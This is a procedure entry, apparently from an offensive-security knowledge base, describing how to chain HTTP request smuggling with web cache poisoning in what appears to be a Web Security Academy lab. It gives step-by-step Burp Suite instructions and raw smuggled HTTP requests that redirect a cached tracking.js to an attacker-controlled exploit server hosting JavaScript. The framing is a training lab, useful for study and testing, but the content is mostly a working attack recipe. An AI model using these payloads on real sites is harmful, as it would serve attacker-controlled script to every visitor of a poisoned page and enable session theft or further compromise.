---
id: 64237552-5963-42fa-8ec0-6788f4062392
name: HTTP Request Smuggling To Perform Cache Poisoning
type: procedure
verified: true
submitted: true
created_at: '2020-09-01T18:00:44.403793+00:00'
updated_at: '2023-05-26T01:34:35.088079+00:00'
platforms:
- Web
tags:
- '[[http request smuggling]]'
- '[[Web Applications]]'
- '[[web cache posioning]]'
---

# HTTP Request Smuggling To Perform Cache Poisoning

**Status**: ✓ Verified

## Summary

An attacker can exploit the request smuggling vulnerability to perform web cache poisoning attack. This will the attack more persisten, whoever visits the application's page after the cache is poisoned will access the manipulated url. 

## Description

# Description

An attacker can exploit the request smuggling vulnerability to perform web cache poisoning attack. This will the attack more persisten, whoever visits the application's page after the cache is poisoned will access the manipulated url.

# Instructions

1. Navigate to blog post and click on next post and intercept the subsequent request using burp suite.

2.Send the request to the repeater tab.

3. Smuggle the request by adding the following lines at the bottom of the above request with a different host header.

`0`

 `GET /post/next?postId=3 HTTP/1.1`
 `Host: 127.0.0.1`
 `Content-Type: application/x-www-form-urlencoded`
 `Content-Length: 10`

 `x=1`

4.Above request can be used to make the next request to get the redirection on a host header with malicious domain.

5.Craft a JS code to trigger a alert and host it on the server .

alert(1)

6.Poison the server by repeatedly sending the request to the server then fetch the resources/js/tracking.js 

`0`

 `GET /post/next?postId=3 HTTP/1.1`
 `Host: your-exploit-server-hostname.web-security-academy.net`
 `Content-Type: application/x-www-form-urlencoded`
 `Content-Length: 10`

 `x=1`

`GET /resources/js/tracking.js HTTP/1.1`
 `Host: your-lab-id.web-security-academy.net`
 `Connection: close`

7.After sending the request multiple times ,observe that the cache is poisned with the crafted exploit from step 5 . Any subsequent visits by the user will trigger the exploit.

## Platforms

- Web

## Tags

- [[http request smuggling]]
- [[Web Applications]]
- [[web cache posioning]]
